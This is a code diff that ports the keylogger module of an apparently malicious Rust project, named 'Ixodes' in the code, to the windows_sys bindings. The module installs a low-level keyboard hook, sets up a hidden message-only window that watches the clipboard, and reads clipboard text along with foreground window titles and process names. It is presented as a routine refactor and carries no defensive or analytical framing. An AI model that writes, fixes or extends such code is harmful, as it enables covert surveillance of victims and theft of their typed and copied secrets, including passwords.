@@ -11,15 +11,16 @@ use std::sync::{Arc, Mutex};
 use std::time::{Duration, SystemTime};
 use tokio::time::interval;
 use tracing::error;
-use windows::Win32::Foundation::{HGLOBAL, HINSTANCE, HMODULE, HWND, LPARAM, LRESULT, WPARAM};
-use windows::Win32::System::DataExchange::{
+use windows_sys::Win32::Foundation::{HWND, LPARAM, LRESULT, WPARAM};
+use windows_sys::Win32::System::DataExchange::{
     AddClipboardFormatListener, CloseClipboard, GetClipboardData, OpenClipboard,
 };
-use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};
-use windows::Win32::System::ProcessStatus::GetModuleBaseNameW;
-use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
-use windows::Win32::UI::Input::KeyboardAndMouse::*;
-use windows::Win32::UI::WindowsAndMessaging::*;
+use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
+use windows_sys::Win32::System::ProcessStatus::GetModuleBaseNameW;
+use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
+use windows_sys::Win32::UI::Input::KeyboardAndMouse::*;
+use windows_sys::Win32::UI::WindowsAndMessaging::*;
+use std::iter::once;
 
 static KEY_LOG_BUFFER: Lazy<Arc<Mutex<String>>> = Lazy::new(|| Arc::new(Mutex::new(String::new())));
 
@@ -105,67 +106,73 @@ impl RecoveryTask for KeyloggerTask {
 
 fn install_hook_and_listener() {
     unsafe {
-        let h_instance = HMODULE::default();
+        let hook_id = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), std::ptr::null_mut(), 0);
 
-        let hook_result = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), h_instance, 0);
+        if hook_id.is_null() {
+            error!("failed to install keyboard hook");
+            return;
+        }
 
-        let hook_id = match hook_result {
-            Ok(h) => h,
-            Err(e) => {
-                error!("failed to install keyboard hook: {}", e);
-                return;
-            }
-        };
+        let class_name_vec: Vec<u16> = "IxodesMsgClass".encode_utf16().chain(once(0)).collect();
+        let class_name = class_name_vec.as_ptr();
 
-        let class_name = windows::core::w!("IxodesMsgClass");
+        let window_name_vec: Vec<u16> = "IxodesMsgWindow".encode_utf16().chain(once(0)).collect();
+        let window_name = window_name_vec.as_ptr();
+
         let wnd_class = WNDCLASSW {
+            style: 0,
             lpfnWndProc: Some(window_proc),
-            hInstance: HINSTANCE(h_instance.0),
+            cbClsExtra: 0,
+            cbWndExtra: 0,
+            hInstance: std::ptr::null_mut(),
+            hIcon: std::ptr::null_mut(),
+            hCursor: std::ptr::null_mut(),
+            hbrBackground: std::ptr::null_mut(),
+            lpszMenuName: std::ptr::null(),
             lpszClassName: class_name,
-            ..Default::default()
         };
 
         RegisterClassW(&wnd_class);
 
         let hwnd = CreateWindowExW(
-            WINDOW_EX_STYLE::default(),
+            0,
             class_name,
-            windows::core::w!("IxodesMsgWindow"),
-            WINDOW_STYLE::default(),
+            window_name,
             0,
             0,
             0,
             0,
-            HWND_MESSAGE,
-            HMENU::default(),
-            h_instance,
-            None,
+            0,
+            HWND_MESSAGE as *mut _,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null(),
         );
 
-        if hwnd.0 != 0 {
-            let _ = AddClipboardFormatListener(hwnd);
+        if !hwnd.is_null() {
+            AddClipboardFormatListener(hwnd);
         }
 
-        let mut msg = MSG::default();
-        while GetMessageW(&mut msg, HWND::default(), 0, 0).as_bool() {
+        let mut msg = std::mem::zeroed::<MSG>();
+        while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) != 0 {
             TranslateMessage(&msg);
             DispatchMessageW(&msg);
         }
 
-        let _ = UnhookWindowsHookEx(hook_id);
+        UnhookWindowsHookEx(hook_id);
     }
 }
 
 unsafe extern "system" fn hook_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
-    if code >= 0 && wparam.0 == WM_KEYDOWN as usize {
+    if code >= 0 && wparam == WM_KEYDOWN as usize {
         unsafe {
-            let kbd_struct = *(lparam.0 as *const KBDLLHOOKSTRUCT);
+            let kbd_struct = *(lparam as *const KBDLLHOOKSTRUCT);
             if let Some(tx) = EVENT_SENDER.lock().unwrap().as_ref() {
                 let _ = tx.send(LogEvent::Key(kbd_struct.vkCode));
             }
         }
     }
-    unsafe { CallNextHookEx(HHOOK::default(), code, wparam, lparam) }
+    unsafe { CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam) }
 }
 
 unsafe extern "system" fn window_proc(
@@ -178,7 +185,7 @@ unsafe extern "system" fn window_proc(
         if let Some(tx) = EVENT_SENDER.lock().unwrap().as_ref() {
             let _ = tx.send(LogEvent::Clipboard);
         }
-        return LRESULT(0);
+        return 0;
     }
     unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) }
 }
@@ -306,33 +313,33 @@ fn trigger_screenshot(ctx: &RecoveryContext) {
 fn get_foreground_info() -> (String, String) {
     unsafe {
         let hwnd = GetForegroundWindow();
-        if hwnd.0 == 0 {
+        if hwnd.is_null() {
             return ("Unknown".to_string(), "Unknown".to_string());
         }
 
         let len = GetWindowTextLengthW(hwnd);
         let title = if len > 0 {
             let mut buf = vec![0u16; (len + 1) as usize];
-            GetWindowTextW(hwnd, &mut buf);
+            GetWindowTextW(hwnd, buf.as_mut_ptr(), len + 1);
             String::from_utf16_lossy(&buf[..len as usize])
         } else {
             "No Title".to_string()
         };
 
         let mut process_id = 0;
-        GetWindowThreadProcessId(hwnd, Some(&mut process_id));
+        GetWindowThreadProcessId(hwnd, &mut process_id);
 
         let process_name = if process_id != 0 {
             let process_handle = OpenProcess(
                 PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-                false,
+                0,
                 process_id,
             );
 
-            if let Ok(h_proc) = process_handle {
+            if !process_handle.is_null() {
                 let mut mod_buf = [0u16; 260];
-                let success = GetModuleBaseNameW(h_proc, HMODULE::default(), &mut mod_buf);
-                let _ = windows::Win32::Foundation::CloseHandle(h_proc);
+                let success = GetModuleBaseNameW(process_handle, std::ptr::null_mut(), mod_buf.as_mut_ptr(), 260);
+                let _ = windows_sys::Win32::Foundation::CloseHandle(process_handle);
 
                 if success > 0 {
                     let end = mod_buf
@@ -372,16 +379,16 @@ fn map_key(vk: u32) -> String {
 
     unsafe {
         let mut state = [0u8; 256];
-        let _ = GetKeyboardState(&mut state);
+        GetKeyboardState(state.as_mut_ptr());
 
         let mut buf = [0u16; 16];
         let scan_code = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
 
-        let result = ToUnicode(vk, scan_code, Some(&state), &mut buf, 0);
+        let result = ToUnicode(vk, scan_code, state.as_ptr(), buf.as_mut_ptr(), 16, 0);
 
         if result > 0 {
             let s = String::from_utf16_lossy(&buf[..result as usize]);
-            if (state[VK_CONTROL.0 as usize] & 0x80) != 0 {
+            if (state[VK_CONTROL as usize] & 0x80) != 0 {
                 return format!("[CTRL+{}]", s.to_uppercase());
             }
             s
@@ -399,25 +406,22 @@ fn map_key(vk: u32) -> String {
 
 fn get_clipboard_text() -> Option<String> {
     unsafe {
-        if OpenClipboard(HWND::default()).is_ok() {
-            let h_data_result = GetClipboardData(CF_UNICODETEXT);
-            if let Ok(h_data) = h_data_result {
-                if h_data.0 != 0 {
-                    let h_global = HGLOBAL(h_data.0 as *mut std::ffi::c_void);
-                    let ptr = GlobalLock(h_global);
-                    if !ptr.is_null() {
-                        let len = (0..)
-                            .take_while(|&i| *ptr.cast::<u16>().add(i) != 0)
-                            .count();
-                        let slice = std::slice::from_raw_parts(ptr.cast::<u16>(), len);
-                        let text = String::from_utf16_lossy(slice);
-                        let _ = GlobalUnlock(h_global);
-                        let _ = CloseClipboard();
-                        return Some(text);
-                    }
+        if OpenClipboard(std::ptr::null_mut()) != 0 {
+            let h_data = GetClipboardData(CF_UNICODETEXT);
+            if !h_data.is_null() {
+                let ptr = GlobalLock(h_data);
+                if !ptr.is_null() {
+                    let len = (0..)
+                        .take_while(|&i| *ptr.cast::<u16>().add(i) != 0)
+                        .count();
+                    let slice = std::slice::from_raw_parts(ptr.cast::<u16>(), len);
+                    let text = String::from_utf16_lossy(slice);
+                    GlobalUnlock(h_data);
+                    CloseClipboard();
+                    return Some(text);
                 }
             }
-            let _ = CloseClipboard();
+            CloseClipboard();
         }
     }
     None
